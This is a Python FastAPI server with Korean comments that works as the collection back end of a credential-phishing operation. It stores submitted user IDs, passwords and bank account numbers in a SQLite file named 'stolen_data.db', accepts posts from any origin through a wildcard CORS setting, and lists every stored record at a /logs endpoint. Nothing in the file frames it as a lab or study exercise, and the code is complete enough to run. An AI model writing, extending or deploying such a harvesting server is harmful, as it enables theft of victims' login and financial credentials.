from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from sqlalchemy import create_engine, Column, Integer, String, DateTime
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker
import datetime

# --- DB 설정 (내 컴퓨터에 sqlite 파일로 저장됨) ---
DATABASE_URL = "sqlite:///./stolen_data.db"
Base = declarative_base()

class StolenInfo(Base):
    __tablename__ = "credentials"
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(String)
    password = Column(String)
    account_number = Column(String, nullable=True)
    timestamp = Column(DateTime, default=datetime.datetime.utcnow)

engine = create_engine(DATABASE_URL)
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base.metadata.create_all(bind=engine)

# --- FastAPI 앱 설정 ---
app = FastAPI()

# 💡 핵심 추가: CORS 설정 (프론트엔드에서 오는 데이터를 막지 않고 다 받아줍니다)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], 
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class InfoCreate(BaseModel):
    user_id: str
    password: str
    account_number: str = None

@app.post("/collect")
async def collect_data(info: InfoCreate):
    db = SessionLocal()
    new_data = StolenInfo(
        user_id=info.user_id, 
        password=info.password, 
        account_number=info.account_number
    )
    db.add(new_data)
    db.commit()
    db.refresh(new_data)
    db.close()
    return {"status": "success", "message": "데이터가 성공적으로 수집되었습니다."}

@app.get("/logs")
async def get_logs():
    db = SessionLocal()
    logs = db.query(StolenInfo).order_by(StolenInfo.timestamp.desc()).all()
    db.close()
    return logs
# 기존 server.py 코드 맨 아래에 이 3줄을 추가하세요!
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("server:app", host="127.0.0.1", port=8000, reload=True)